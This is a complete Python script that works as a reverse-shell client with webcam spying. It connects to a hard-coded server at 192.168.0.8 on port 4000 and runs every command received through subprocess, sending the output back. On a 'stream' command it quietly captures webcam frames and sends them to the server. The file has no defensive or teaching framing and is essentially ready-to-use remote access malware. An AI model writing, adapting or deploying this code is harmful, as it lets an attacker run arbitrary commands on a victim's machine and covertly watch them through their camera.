import socket  # For network (client-server) communication.
import cv2  # For recording the video.
import threading  # For recording the video in a different thread.
import subprocess  # For executing shell commands.

SERVER_HOST = "192.168.0.8"
SERVER_PORT = 4000
BUFFER_SIZE = 1024 * 128  # 128KB max size of messages, you can adjust this.
# Separator string for sending 2 messages at a time.
SEPARATOR = "<sep>"
# Create the socket object.
s = socket.socket()
# Connect to the server.
s.connect((SERVER_HOST, SERVER_PORT))

# Global variable for video capture
cap = None

# Function to stream live video
def stream_video():
    global cap
    cap = cv2.VideoCapture(0)
    while True:
        ret, frame = cap.read()
        if not ret:
            break
        _, frame_bytes = cv2.imencode('.jpg', frame)
        frame_size = len(frame_bytes)
        s.sendall(frame_size.to_bytes(4, byteorder='little'))
        s.sendall(frame_bytes)
    cap.release()
    cv2.destroyAllWindows()

while True:
    # receive the command from the server.
    command = s.recv(BUFFER_SIZE).decode()
    if command.lower() == "exit":
        # if the command is exit, just break out of the loop.
        break
    elif command.lower() == "stream":
        # Start streaming video in a separate thread
        streaming_thread = threading.Thread(target=stream_video)
        streaming_thread.start()
        print("Live video streaming started.")
    else:
        # execute the command and retrieve the results.
        output = subprocess.getoutput(command)
        # send the results back to the server.
        s.send(output.encode())
# close client connection.
s.close()